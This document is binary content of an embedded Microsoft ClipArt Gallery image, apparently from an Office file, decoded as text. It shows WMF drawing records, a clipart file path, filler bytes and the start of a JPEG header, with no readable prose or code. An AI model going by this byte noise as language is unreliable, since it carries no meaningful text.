  �����     �      F   Microsoft ClipArt Gallery    MS_ClipArt_Gallery    MS_ClipArt_Gallery.5 �9�q            \�g�x�j�^�Q�F�>�2�%���L   $$ � n� ^� K� ;� /� (�  � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � 	� � '� /� 9� D� R� ^� e� t� n� nL   $$ �������������|�m�^�R�E�7�'����,�;�E�M�Y�e�s�}����������������������*   $ � �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� �B   $ � �����%�/�9�B�H�N�T�Y�Y�U�P�N�M�I�C�?�>�:�1�%���� �� �� �0   $ �#�-�3�9�?�D�J�N�Q�Q�K�F�@�9�-�$������B   $ � V� T� T� U� W� [� b� n� w� �� �� �� �� �� �� �� �� �� �� �� �� y� s� m� e� _� ]� ]� b� V� V<   $ �/�3�4�3�2�/�,�,�,�)�$� �������� �%�'�+�+�*�,�/�/6  $� � �� �� �� �� �� �� �� �� �� 
"*)22879;7>3B+GN
U�\�e�k�o�r�t�t|tppckTbCX3L B:2� +� $� � � 
�
����������������(   $ i�r���������������������������t�i�i�"   $ 	����#�)�/�/�(����	�	�	�&   $ 9EBMGTN]TeYn^udcval]cVZQSOMGE9E9E(   $ W>^FeMmTt\zck�s�y�n�bxVqPiHcB^<W>W>R   $' ��(�2�<�D�N�X�a�k�w������'�-�1�6�&����� ������t�g�X�L�?�5�,�%����N   $% `,p4?�F�K�O�T�Z�`�d�d�g�k�p�z���������������x�q�m�n�j�f�a�[�U�R�Jn@_6`,`,*   $ SD^LeUl_rhupyw|���z�t~mshia`[WUQJGSDSDR   $' +>(N$[!gsy#~'+~/~3{2�3�6�9�>�B�H�N�R�X�Z�T�L�F�A�B|At?p;l5o/r+q.j1\4P9D+>+>�   $l XPXXVcSlPsL{L�N�R�U�Z�^�c�f�j�k�k�e�Y�P�B�9�)�����������t�g�T�F�;�5�+���� �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� ���'�2�>�Q�f�z���������������� �'�6�J�^�r������������������������������z�v�o�j�e�a�_�^�^{aocdeXdP_LXPXP^   $- P�T�X�[�^�c�i�o�t�y�|�����������������������������������������������}�x�q�l�g�d�^�V�R�P�P�2   $ =Z7Y2\-`*e*j.o5s:u@uCpCkDg?c:c9h5k3e6b9_=_=Z=Z   $
���
���	�������������������������������������������������������������s���a���M���8���8���&�����������������������������������������~���s���i���^���T���J���?���3���&�������|�	�����������������{���u���o���p���t�m�t�P�j�5�e�&�_��Y�	�T���P���M���L���N���W���_���d���f�}�f�}�d�r�`�h�Z�`�R�Y�M�W�H�T�B�R�=�P�7�N�2�L�,�I�'�G�,�=�3�3�:�)�A��G��K��M���L���I���F���B���?���:���6���0���+���%�������������������������������������������������������������������������������������v���k���`���T���G���=���3���)��� �����������������������.�	�/��0���1���1���2���3���4���6���7���9���<���>���?���?���>���<���<���=���?���@��A��D�~�H�w�M�p�S�j�Y�e�`�b�h�`�p�_�}�b���g���l���l���r���z���������x��o��j�-�l�A�n�A�p�H�q�Q�p�Y�n�`�i�f�e�l�`�r�]�y�Y��V���S���P���M���L���M���N���O���P���O���O���M���F���>���7���.��%���,��?�
������������ ���!���"���"���#���%���(���*���,���.���*���'���%���#���������������� ����� �
���	�����������������������������������������������������������������������������������{���w���t���l���e���]���V���N���G���@���9���4���0���+���'���"���������������������������������%���+���0���5���8���:���;���<���;���5���-��%�x��o��a��c�
�d��f���g���h���h���i���j���k���l���l���n���s���{��������������������������������������������������������������������������������������������������������"���,���4���<��?�
�C��F��J��M�!�R�&�W�+�]�(�\�#�[��Y��X��R� �L���E���=���4���)���������������������������������������������"���%���)���/���5���<���C���J���R���Z���c���f���j���o���s���������������������������������������������������������������������� ����������� ��-��9��E��F��G��G�
�]�
�Y���X���X���X���W���Q���I��>��3� �&�+��5��?���G���E��:��0��&�%��-��4��8���9���:���:���:���;���5���0���-���*���'���$��� �����������	��� ���&���,���1���/���&� ����	��
�R��L���F���?���^���a���e���i� �l��q��v�	�z�
���������������
�/��)��#����� �"���&���*���B���Z��p�������~��|���y���v���r���n���i���o���w����������������� ���������'���5���B���6���*��������������������������������������������������������������������&���.� �6��>��G��O��W��^��^��O��A��3��&������ �����������������!��)��1��9�)�@�6�F�D�L�S�P�c�S�l�V�c�V�Z�V�R�V�I�V�@�V�7�U�/�U�'�T�'�U�#�V��V��U��T��S��R�
���
����/��B��E��J��N��R�"�b�%�v�*���5���5���5���4���4���-���'���!�������{��t�
������������ ���&���-���5���>���F���N���V���^���d���k���p���t���x���}�
���������)���3���>���B���G���M���S���Z���b���j���s���w���}�������������������������������������������������������������������������������
������*���9���I���X���h���y���|���~���������{���v���p���j���d���`���]���\���X���S�x�M�m�G�b�@�W�:�L�5�A�1�5�4�5�;�?�B�H�J�Q�S�Z�[�c�c�l�j�v�q����������������������������������������&���7���H���Y���j���{�������������������������������������������������������������������������������=���=���E���M���U���]���e���l���s���z���s���l���e���^���V���O���G���@���@���6���-���$���������
������������������������������������)���2���<���D���M���V���_���i���   -    �    -    -    �   33      -     (   $ ��{���t���y���}�������������������������������������������������������{�   -    �    -    -    �   33      -     .   $ m�u�k�o�g�l�b�i�^�g�V�g�O�h�H�k�A�l�@�n�?�p�>�q�?�s�D�u�J�w�P�y�U�{�\�{�c�{�i�z�m�u�   -    �    -    -    �   33      -     ^   $- O�C�K�B�G�A�B�@�>�@�9�?�5�>�0�>�,�=��:��6��1���,���&��� ���������
����������������������������������������{��������������������������� ���(���/���5���:��>��A�*�C�<�D�O�C�   -    �    -    -    �   33      -     &   $ ��>���?���?���?���?���?���?���?���@���B���C���D���D���C���B���@���>�   -    �    -    -    �   33      -     �   $A ��$���!����������������t��g��c��_��Z�
����.��3��9� �>�!�D�"�I�#�O�$�U�%�[�%�`�&�e�'�j�(�o�(�u�(�z�)���)���)���)���)���)���(���(���'���%���$�   -    �    -    -    �   33      -     F   $! �����������
�b��i��q��z��������������������   -    �    -    -    �   33      -     h   $2 (��������������������������������������������������|�}�t�r�k�g�b�^�W�V�K�N�>�F�2�=�&�4��)���
�#��,�/�7�A�C�S�P�c�_�q�o�}�����������������������������������������������������	���������(���(���   -    �    -    -    �   33      -     *   $ $���$������������
���	���	���
������
�����������������z���t�y�n�q�i�h�c�`�\�Y�T�R�K�L�;�A�*�7��-��%��� ���������%���'���*���,���.���0���2���5���9���9���;���>���B���G���N�
�U��^�!�e�%�o�)�y�1���4���5���7���9���;���<���>���?���A���@���>���;�	�7��5�1�6�F�9�\�>�l�C�|�J���S���X���\���_���c���g���l���s���{�������   -    �    -    -    �   33      -     8   $ o���l�y�i�k�g�]�f�M�b�8�c�!�f�
�j���k���i���i���h���f���`���c���d���c���^��U�,�R�M�U�l�b���q���o���o���   -    �    -    -    �  ���      -     �   $? ��������������������������t���h���^���R���F���;���/������������������������������������l���U���?���*���������/���D���0���0�������������������������%���6���C���O���\���i��������������������������,���W�����������������������������������������   -    �    -    -    �  ���      -     X   $* 
��$� �B� �a����������������	���
������
�������� ��)��2��;��D��>��8��2��-�   -    �    -    -    �   33      -         $ =��>��@��A��B�
������������������
���
�n��{������������������������������������������|���m���`���R� �D��7��a��a�
�   -    �    -    -    �   33      -     "  $� ��s���b���O���=���,������ ��������}���u���k���_��Y�|�R�y�L�w�E�u�>�t�6�s�/�q�(�p�+�r�/�s�3�u�7�v�;�x�?�z�C�}�G��L���Q���U���Z���Y���V���R���O���-���0���5���9���=���F���M���R���U���U���N���H���A���:���B���H���L���Q���T���X���\���a���t��p��l��h��d��`��\��X��U�
�^��f�
�j��j��j�
�)��&���#���;���R���i������������������������������������������������
�x��j��\��M��>��/�   -    �    -    -    �  ���      -     .   $ @�6�;�3�6�1�0�1�*�1�#�2��3��4��5��8��;�"�>�'�A�,�D�1�G�5�K�9�O�@�L�A�F�@�>�@�6�   -    �    -    -    �  ���      -     �   $J ����������������������������������������������������������~���z���w���t���u���w���z���}����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   -    �    -    -    �  ���      -     d  $� ��������������������������v���k���a���^���[���Y���X���V���T���R���O���J���H���H���I���K���L���M���O���S���X���Z���Y���R���L���F���@���:���5���0���,��)�z�&�i�#�W� �W��W��V��V��^��f��n��v��}�����������������������������#���)���1���4���6���6��5��/��(���!��!�� ���
���������������������
���������������������������������������������������� ������
��
�������������������
�����������������������������������}���z���v���r���o���k���e���`���Z��S��M��F��@��:���4���.���)���)��+�	�,��,��.��1��4��6�!�7�'�8�*�9�.�9�2�;�5�?�;�H�;�Q�;�Y�;�b�;�k�;�s�<�{�>��@��I���S���_���l���y���������������������������������   -    �    -    -    �  ���      -     &   $ H���G���C���?���;���0���)���%��� ���&���,���1���7���;���@���D���H���   -    �    -    -    �  ���      -     J   $# ��k���n���q���s���r��_���[���Y���Y���Y���Z���\���]���_��`��a��b��d��g��j��m��p���r���s���t���t���r���o���k���h���e���c���d���f���k�   -    �    -    -    �  ���      -     @   $ `���a���`���]���Y���U���P���K���F���F���A���<���8���3���/���,���)���'���(���+���0���6���:���?���D���I���O���V���]���`���   -    �    -    -    �  ���      -     H   $" ������������������������������������������������������{���{�����������������������������������������������������   -    �    -                        "���������������������������������%���+���0���5���8���:���;���<���;���5���-��%�x��o��a��c�
�d��f���g���h���h���i���j���k���l���l���n���s���{��������������������������������������������������������������������������������������������������������"���,���4���<��?�
�C��F��J��M�!�R�&�W�+�]�(�\�#�[��Y��X��R� �L���E���=���4���)���������������������������������������������"���%���)���/���5���<���C���J���R���Z���c���f���j���o���s���������������������������������������������������������������������� ����������� ��-��9��E��F��G��G�
�]�
�Y���X���X���X���W���Q���I��>��3� �&�+��5��?���G���E��:��0��&�%��-��4��8���9���:���:���:���;���5���0���-���*���'���$��� �����������	��� ���&���,���1���/���&� ����	��
�R��L���F���?���^���a���e���i� �l��q��v�	�z�
�/��)��#����� �"���&���*���B���Z��p�������~��|���y���v���r���n���i���o���w����������������� ���������'���5���B���6���*��������������������������������������������������������������������&���.� �6��>��G��O��W��^��^��O��A��3��&������ �����������������!��)��1��9�)�@�6�F�D�L�S�P�c�S�l�V�c�V�Z�V�R�V�I�V�@�V�7�U�/�U�'�T�'�U�#�V��V��U��T��S��R�
���
����/��B��E��J��N��R�"�b�%�v�*���5���5���5���4���4���-���'���!�������{��t�
������������ ���&���-���5���>���F���N���V���^���d���k���p���t���x���}�
���������)���3���>���B���G���M���S���Z���b���j���s���w���}�������������������������������������������������������������������������������
������*���9���I���X���h���y���|���~���������{���v���p���j���d���`���]���\���X���S�x�M�m�G�b�@�W�:�L�5�A�1�5�4�5�;�?�B�H�J�Q�S�Z�[�c�c�l�j�v�q����������������������������������������&���7���H���Y���j���{�������������������������������������������������������������������������������=���=���E���M���U���]���e���l���s���z���s���l���e���^���V���O���G���@���@���6���-���$���������
������������������������������������)���2���<���D���M���V���_���i���   -    �    -    -    �   33      -     (   $ ��{���t���y���}�������������������������������������������������������{�   -    �    -    -    �   33      -     .   $ m�u�k�o�g�l�b�i�^�g�V�g�O�h�H�k�A�l�@�n�?�p�>�q�?�s�D�u�J�w�P�y�U�{�\�{�c�{�i�z�m�u�   -    �    -    -    �   33      -     ^   $- O�C�K�B�G�A�B�@�>�@�9�?�5�>�0�>�,�=��:��6��1���,���&��� ���������
����������������������������������������{��������������������������� ���(���/���5���:��>��A�*�C�<�D�O�C�   -    �    -    -    �   33      -     &   $ ��>���?���?���?���?���?���?���?���@���B���C���D���D���C���B���@���>�   -    �    -    -    �   33      -     �   $A ��$���!����������������t��g��c��_��Z�
����.��3��9� �>�!�D�"�I�#�O�$�U�%�[�%�`�&�e�'�j�(�o�(�u�(�z�)���)���)���)���)���)���(���(���'���%���$�   -    �    -    -    �   33      -     F   $! �����������
�b��i��q��z��������������������   -    �    -    -    �   33      -     h   $2 (��������������������������������������������������|�}�t�r�k�g�b�^�W�V�K�N�>�F�2�=�&�4��)���
�#��,�/�7�A�C�S�P�c�_�q�o�}�����������������������������������������������������	���������(���(���   -    �    -    -    �   33      -     *   $ $���$������������
���	���	���
������
�����������������z���t�y�n�q�i�h�c�`�\�Y�T�R�K�L�;�A�*�7��-��%��� ���������%���'���*���,���.���0���2���5���9���9���;���>���B���G���N�
�U��^�!�e�%�o�)�y�1���4���5���7���9���;���<���>���?���A���@���>���;�	�7��5�1�6�F�9�\�>�l�C�|�J���S���X���\���_���c���g���l���s���{�������   -    �    -    -    �   33      -     8   $ o���l�y�i�k�g�]�f�M�b�8�c�!�f�
�j���k���i���i���h���f���`���c���d���c���^��U�,�R�M�U�l�b���q���o���o���   -    �    -    -    �  ���      -     �   $? ��������������������������t���h���^���R���F���;���/������������������������������������l���U���?���*���������/���D���0���0�������������������������%���6���C���O���\���i��������������������������,���W�����������������������������������������   -    �    -    -    �  ���      -     X   $* 
��$� �B� �a����������������	���
������
�������� ��)��2��;��D��>��8��2��-�   -    �    -    -    �   33      -         $ =��>��@��A��B�
������������������
���
�n��{������������������������������������������|���m���`���R� �D��7��a��a�
�   -    �    -    -    �   33      -     "  $� ��s� ��
  �����     �      F   Microsoft ClipArt Gallery    MS_ClipArt_Gallery    MS_ClipArt_Gallery.5 �9�q            ��Z���Y���V���R���O���-���0���5���9���=���F���M���R���U���U���N���H���A���:���B���H���L���Q���T���X���\���a���t��p��l��h��d��`��\��X��U�
�^��f�
�j��j��j�
�)��&���#���;���R���i������������������������������������������������
�x��j��\��M��>��/�   -    �    -    -    �  ���      -     .   $ @�6�;�3�6�1�0�1�*�1�#�2��3��4��5��8��;�"�>�'�A�,�D�1�G�5�K�9�O�@�L�A�F�@�>�@�6�   -    �    -    -    �  ���      -     �   $J ����������������������������������������������������������~���z���w���t���u���w���z���}����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   -    �    -    -    �  ���      -     d  $� ��������������������������v���k���a���^���[���Y���X���V���T���R���O���J���H���H���I���K���L���M���O���S���X���Z���Y���R���L���F���@���:���5���0���,��)�z�&�i�#�W� �W��W��V��V��^��f��n��v��}�����������������������������#���)���1���4���6���6��5��/��(���!��!�� ���
���������������������
���������������������������������������������������� ������
��
�������������������
�����������������������������������}���z���v���r���o���k���e���`���Z��S��M��F��@��:���4���.���)���)��+�	�,��,��.��1��4��6�!�7�'�8�*�9�.�9�2�;�5�?�;�H�;�Q�;�Y�;�b�;�k�;�s�<�{�>��@��I���S���_���l���y���������������������������������   -    �    -    -    �  ���      -     &   $ H���G���C���?���;���0���)���%��� ���&���,���1���7���;���@���D���H���   -    �    -    -    �  ���      -     J   $# ��k���n���q���s���r��_���[���Y���Y���Y���Z���\���]���_��`��a��b��d��g��j��m��p���r���s���t���t���r���o���k���h���e���c���d���f���k�   -    �    -    -    �  ���      -     @   $ `���a���`���]���Y���U���P���K���F���F���A���<���8���3���/���,���)���'���(���+���0���6���:���?���D���I���O���V���]���`���   -    �    -    -    �  ���      -     H   $" ������������������������������������������������������{���{�����������������������������������������������������   -    �    -                        ~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~   �������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������         ����       )
������������n�G�6�6�4�$������ 
� � 1� C� X� _� [� Sdw'�7�C�O�Y~dqr8w
�
�   �  ��      -    � @   $ ;� F� L� Q� X_g#t $������ �� �� �� �� �� �{ �� �{ |� l� [� I� =� ;� ;�    �  ���      -    � 6   $ �b�y������+�6�8�9�=�I�X�d�v�w�vgq4H+1�?�L�b�b   �  ?��      -    � d   $0 � �~ �t �w �| �r }r qu jk _g Ko <p -| � #� &� (� &� aw��������������2&F2S7a=iDkQi`fsa�b�q���f���w�3�� �� �� �� �   �  �Ÿ      -    � R   $' �������������1�S�^�t��������������������������������z�_�>�!#
 L� P� V� c� f� c� [� P� L� L�    �  �Ÿ      -    �    $ �)�.�/�&������)�)   $ ��� �� �� �� �� � 
� � ��   �  ̌�      -    � ,   $  )6CMTYX Q�F�;�,���	   �  ���      -    �    $ �8�C�F�8���   �           -    �    $ @ h O e ] � _ � W � @ h @ h >   $  �  � ) � 0 � : � @ � E � H � L � T � ] � b � b � ` U P � G � < � 5 � * � $ � * � * � % �  �  �  �  �  �    $	 e 	r 	{ � { $o $g e 	e 	   $ _ � h � m � j � _ � _ � _ �    $
� � � � � 	� � � � $   $ � � (3
?K
"*)22879;7>3B+GN
U�\�e�k�o�r�t�t|tppckTbCX3L B:2� +� $� � � 
�
����������������(   $ i�r���������������������������t�i�i�"   $ 	����#�)�/�/�(����	�	�	�&   $ 9EBMGTN]TeYn^udcval]cVZQSOMGE9E9E(   $ W>^FeMmTt\zck�s�y�n�bxVqPiHcB^<W>W>R   $' ��(�2�<�D�N�X�a�k�w������'�-�1�6�&����� ������t�g�X�L�?�5�,�%����N   $% `,p4?�F�K�O�T�Z�`�d�d�g�k�p�z���������������x�q�m�n�j�f�a�[�U�R�Jn@_6`,`,*   $ SD^LeUl_rhupyw|���z�t~mshia`[WUQJGSDSDR   $' +>(N$[!gsy#~'+~/~3{2�3�6�9�>�B�H�N�R�X�Z�T�L�F�A�B|At?p;l5o/r+q.j1\4P9D+>+>�   $l XPXXVcSlPsL{L�N�R�U�Z�^�c�f�j�k�k�e�Y�P�B�9�)�����������t�g�T�F�;�5�+���� �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� ���'�2�>�Q�f�z���������������� �'�6�J�^�r������������������������������z�v�o�j�e�a�_�^�^{aocdeXdP_LXPXP^   $- P�T�X�[�^�c�i�o�t�y�|�����������������������������������������������}�x�q�l�g�d�^�V�R�P�P�2   $ =Z7Y2\-`*e*j.o5s:u@uCpCkDg?c:c9h5k3e6b9_=_=Z=Z   $
6�2�-�'��0�0<   $ ��������������������������������������������������������N   $% �1�#����������������"�3�B�M�W�_�h�c�V�?�*�������������������
�������(�-�1�1�1�3�7�9�:�>�F�Q�Z�b�h�n�g�_�S�F|>u6r2v0}-�+�+�)�'���� y�n�f�^�\�Z�c�c0   $ � ������������
����!�#�#�"� � D   $  q^vb{b^�X�R�N�G�C�6w-n%aXL>0&� "0>JU!i/w>{F{KwRq^q^R   $' �� �� �� �� �� �� �� �� �� �� �� �� �� �����
���� �� �� �� �� �� �� �� �� �� �� 6   $ ��� �� �� �� �� �� �� ��  � � 	� 	� � � � �� �� �� �� �� ���0   $ MSZ+b8gFjSlhm}n�n�i�n�s�t�uxvfvNu@t3_MM.   $ (� 3� ;� C� I� N� P� M� G� =� 5� +� !� � � � &   $ X� [ ^cgjkkfc� b� `� \� U� W� X� X� Z   $+ �� �� �� �� �� �� �� �� �� �� �� �� �� ����~uokm r v��������� �� �� �� �� �� �� �� �� �� �� ��    $ Q� T� W� \� a� c� c� ^� \� U� Q� Q� <   $ �� x� n� c� W� M� G� @� =� C� I� N� R� T� W� X� X� T� P� L� S� ^� k� v� � �� �� ��                        ����������������������������������������������������������������������������������   C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~   ���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������  ���All Categories c:\Program\Vanliga filer\Microsoft Shared\Clipart\cagcat50\PE02484_.wmf  �         -x� � ��2���n ���g���  �            � x     �n č��  �       @�n & x  �            ����� x                ��n        All CategoriesGc:\Program\Vanliga filer\Microsoft Shared\Clipart\cagcat50\PE02484_.wmf                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           ���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~      ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������ ����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������                  ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~         ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������ ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������ JFIF  H H  �� C 		

  �����     �      F   Microsoft ClipArt Gallery    MS_ClipArt_Gallery    MS_ClipArt_Gallery.5 �9�q            }��x� ������K�\[�02��7;�$'���v��)�~N��c�B�U�v� Jt��;���_[J�J�wk�2�ٙ-=	��E�C��se�� 6bPZ>�%�Ӄ/?	`Ȕ��X�4�ә�y�2��0!�`dm�y������i��o��.�8�s[��4 Am��~�D�}�h�9�����z^<v����G��'�=�eEͬ�MHt��:OR������Z<@�K�;�}�`'g��Z��GM��&7��}Ra��U��U��Z}���9�DЎQ+k������J� ��'x�|����p�ί�i{����U����]#`w�b�E��~j��\}rai��:��Z��B�<��<{��gk1�����E����6'����1)c�����|i�v ��}��r�x���q�.:1@n���~�5N�Ϡ뒻2����?x��q����(tQ����m.%�1�Io��e��8b����C���n�+���`>��]�0�a�zXa�T��ǘ�=����ǯ�9�r� u4yP�Dg�z=j<=)�p�9|ɳ�n|x�ȏ�����2$#{�� ���Ũ��XC�P��柍hh���&r8��wǙ�������i?n�n��C=
���\���^ʻ�qV��/�}ᛨt)���r5� y/��6���Z�-I$�	\Z(Y�E��)�2<�Ե��H*�U��rc������ʼۆ�7�6:����I�8Mg�M �e�RD�;ZP�ě�.;$�� Bx)�+��m����pO���E����Q�U���v<�2Fz��:1���I���4"�?'��� .�5y7@�� 
b[$g$A���=���hi$D����d/`�ZF�@����E���惽�M\Y����fߓ�7���&2<|9���pŏ��E��Ռp����j�<�#�M��1�nZ���E�<���u]�KK�Ơ̑�En� S����k�4A�M��q��c���u���F��8���44N��9��!�E�&���+���S�~>K��#w�+��c�u�ie��i�o|�3���J��2��;��8���IU��D�&��+lx퇏.931d������ώ�g>�������ZtL�ZǔI��'��Oe�p)�L��F�~����rB�໏��B)d���O�4�������MN7w}�����Yg�kڞp�